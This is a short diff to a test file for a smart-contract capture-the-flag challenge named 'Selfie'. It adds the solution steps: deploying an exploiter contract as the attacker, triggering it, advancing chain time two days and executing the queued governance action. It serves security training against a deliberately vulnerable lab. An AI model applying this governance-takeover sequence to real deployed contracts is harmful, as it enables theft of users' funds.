@@ -31,6 +31,14 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const SelfieExploiter = await ethers.getContractFactory("SelfieExploiter")
+        this.selfieExploiter = await SelfieExploiter.connect(attacker).deploy(this.token.address,this.governance.address,this.pool.address)
+
+        await this.selfieExploiter.runExploit()
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]) // 2 days
+        await this.governance.connect(attacker).executeAction(await this.selfieExploiter.actionId())
+
     });
 
     after(async function () {
